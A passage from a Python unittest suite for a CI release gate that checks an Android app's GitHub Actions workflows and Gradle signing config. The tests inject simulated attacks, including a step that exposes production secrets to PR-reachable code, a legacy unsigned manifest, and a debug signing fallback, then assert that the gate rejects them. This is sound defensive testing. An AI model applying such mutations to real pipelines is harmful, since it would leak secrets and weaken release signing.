        '--dart-define=UPDATE_SIGNING_PUBLIC_KEY_B64="$UPDATE_SIGNING_PUBLIC_KEY_B64"': gate.validate_workflow_release_triggers,
        '--dart-define=APK_VERSION_URL="https://pr-canary.invalid/': gate.validate_mobile_build_workflow,
        '--dart-define=APK_FALLBACK_VERSION_URL="https://pr-fallback.invalid/': gate.validate_mobile_build_workflow,
        '--dart-define=UPDATE_SIGNING_KEY_ID="rfc8032-test-key-1"': gate.validate_mobile_build_workflow,
        '--dart-define=UPDATE_SIGNING_PUBLIC_KEY_B64="11qYAYKxCrfVS/7TyWQHOg7hcvPapiMlrwIaaPcHURo="': gate.validate_mobile_build_workflow,
    }
    for fragment, validator in fragments.items():
      with self.subTest(fragment=fragment):
        workflows = self._workflow_sources()
        self.assertIn(fragment, workflows[path])
        workflows[path] = workflows[path].replace(fragment, "REMOVED", 1)
        with self.assertRaisesRegex(gate.GateError, "production Android build|PR canary"):
          validator(workflows)

  def test_mobile_workflow_rejects_missing_protected_producer_or_legacy_metadata(self):
    path = ".github/workflows/build_app.yml"
    for fragment in (
        "python scripts/ota_contract_gate.py mobile-manifest-create",
        "python scripts/ota_contract_gate.py mobile-manifest-verify",
        '--expected-package-name "com.kshouse.gatekeeper_app"',
        '--apkanalyzer "$APKANALYZER"',
        '--apksigner "$APKSIGNER"',
        '--commit "${{ github.sha }}"',
    ):
      with self.subTest(fragment=fragment):
        workflows = self._workflow_sources()
        workflows[path] = workflows[path].replace(fragment, "REMOVED", 1)
        with self.assertRaisesRegex(gate.GateError, "metadata binding|PR metadata binding"):
          gate.validate_mobile_build_workflow(workflows)

    workflows = self._workflow_sources()
    workflows[path] = workflows[path].replace(
        "          ls -la dist/",
        '          cat <<EOF > dist/version.json\n          {"updated_at":"legacy"}\n          EOF\n          ls -la dist/',
    )
    with self.assertRaisesRegex(gate.GateError, "legacy unsigned"):
      gate.validate_mobile_build_workflow(workflows)

  def test_mobile_pr_reachable_steps_reject_every_production_secret_reference(self):
    path = ".github/workflows/build_app.yml"
    secret_expressions = (
        "${{ secrets.OTA_SIGNING_PRIVATE_KEY_HEX }}",
        "${{ secrets.OTA_SIGNING_PUBLIC_KEY_HEX }}",
        "${{ secrets.SECRET_APK_DOWNLOAD_URL }}",
        "${{ secrets.GATEKEEPER_API_KEY }}",
    )
    for secret_expression in secret_expressions:
      with self.subTest(secret=secret_expression):
        workflows = self._workflow_sources()
        parsed = gate.load_workflow_yaml(path, workflows[path])
        step = next(
            item for item in parsed["jobs"]["build_apk"]["steps"]
            if item.get("name") == "Prepare public mobile canary metadata"
        )
        step["env"] = {"ATTACKER_READS_PROCESS_ENV": secret_expression}
        workflows[path] = gate.yaml.safe_dump(parsed, sort_keys=False)
        with self.assertRaisesRegex(gate.GateError, "PR-reachable step|zero production secret"):
          gate.validate_workflow_release_triggers(workflows)

    workflows = self._workflow_sources()
    workflows[path] = workflows[path].replace(
        "      github.ref == 'refs/heads/main'",
        "      github.ref != 'refs/heads/main'",
        1,
    )
    with self.assertRaisesRegex(gate.GateError, "authorized production trigger"):
      gate.validate_workflow_release_triggers(workflows)

  def test_mobile_manifest_execution_cannot_escape_protected_gate(self):
    path = ".github/workflows/build_app.yml"
    workflows = self._workflow_sources()
    workflows[path] = workflows[path].replace(
        "python scripts/ota_contract_gate.py mobile-manifest-create",
        "python scripts/sign_mobile_manifest.py create",
        1,
    )
    with self.assertRaisesRegex(gate.GateError, "protected ota_contract_gate"):
      gate.validate_mobile_build_workflow(workflows)

  def test_mobile_production_manifest_step_is_environment_protected_and_bound(self):
    path = ".github/workflows/build_app.yml"
    fragments = (
        "${{ secrets.OTA_SIGNING_PRIVATE_KEY_HEX }}",
        "python scripts/ota_contract_gate.py mobile-manifest-create",
        "python scripts/ota_contract_gate.py mobile-manifest-verify",
        '--expected-package-name "com.kshouse.gatekeeper_app"',
        '--apkanalyzer "$APKANALYZER"',
        '--apksigner "$APKSIGNER"',
        '--commit "${{ github.sha }}"',
    )
    for fragment in fragments:
      with self.subTest(fragment=fragment):
        workflows = self._workflow_sources()
        producer_offset = workflows[path].index(
            "      - name: Create production signed mobile manifest"
        )
        before, producer = (
            workflows[path][:producer_offset],
            workflows[path][producer_offset:],
        )
        self.assertIn(fragment, producer)
        workflows[path] = before + producer.replace(fragment, "REMOVED", 1)
        with self.assertRaisesRegex(
            gate.GateError,
            "production mobile manifest|producer identity binding|create/verify",
        ):
          gate.validate_workflow_release_triggers(workflows)

  def test_mobile_source_commit_embedding_cannot_be_removed(self):
    path = ".github/workflows/build_app.yml"
    fragment = "printf '%s\\n' '${{ github.sha }}' > gatekeeper_app/assets/source_commit.txt"
    for occurrence in (1, 2):
      with self.subTest(occurrence=occurrence):
        workflows = self._workflow_sources()
        if occurrence == 1:
          workflows[path] = workflows[path].replace(fragment, "REMOVED", 1)
          validator = gate.validate_mobile_build_workflow
        else:
          first = workflows[path].index(fragment)
          second = workflows[path].index(fragment, first + len(fragment))
          workflows[path] = workflows[path][:second] + workflows[path][second:].replace(
              fragment, "REMOVED", 1
          )
          validator = gate.validate_workflow_release_triggers
        with self.assertRaisesRegex(gate.GateError, "embed exact source commit|production Android build"):
          validator(workflows)

  def test_mobile_workflow_rejects_tests_after_apk_build(self):
    path = ".github/workflows/build_app.yml"
    workflows = self._workflow_sources()
    parsed = gate.load_workflow_yaml(path, workflows[path])
    steps = parsed["jobs"]["build_apk"]["steps"]
    native_index = next(
        index for index, step in enumerate(steps)
        if step.get("name") == "Run targeted native GATT unit tests before APK build"
    )
    native_step = steps.pop(native_index)
    prepare_index = next(
        index for index, step in enumerate(steps)
        if step.get("name") == "Prepare public mobile canary metadata"
    )
    steps.insert(prepare_index, native_step)
    workflows[path] = gate.yaml.safe_dump(parsed, sort_keys=False)
    with self.assertRaisesRegex(gate.GateError, "must precede"):
      gate.validate_mobile_build_workflow(workflows)

  def test_mobile_release_signing_is_fail_closed_under_mutation(self):
    source = (
        gate.ROOT / "gatekeeper_app/android/app/build.gradle.kts"
    ).read_text(encoding="utf-8")
    gate.validate_mobile_release_signing_config(source)
    for fragment in (
        "releaseKey == null || !releaseKey.exists()",
        'keystoreProperties.getProperty("storePassword").isNullOrBlank()',
        'keystoreProperties.getProperty("keyAlias").isNullOrBlank()',
        'keystoreProperties.getProperty("keyPassword").isNullOrBlank()',
        'signingConfig = signingConfigs.getByName("release")',
    ):
      with self.subTest(fragment=fragment):
        with self.assertRaisesRegex(gate.GateError, "fail-closed seam"):
          gate.validate_mobile_release_signing_config(
              source.replace(fragment, "REMOVED", 1)
          )
    with self.assertRaisesRegex(gate.GateError, "debug signing fallback"):
      gate.validate_mobile_release_signing_config(
          source + '\nsigningConfig = signingConfigs.getByName("debug")\n'
      )

if __name__ == "__main__":
  unittest.main()
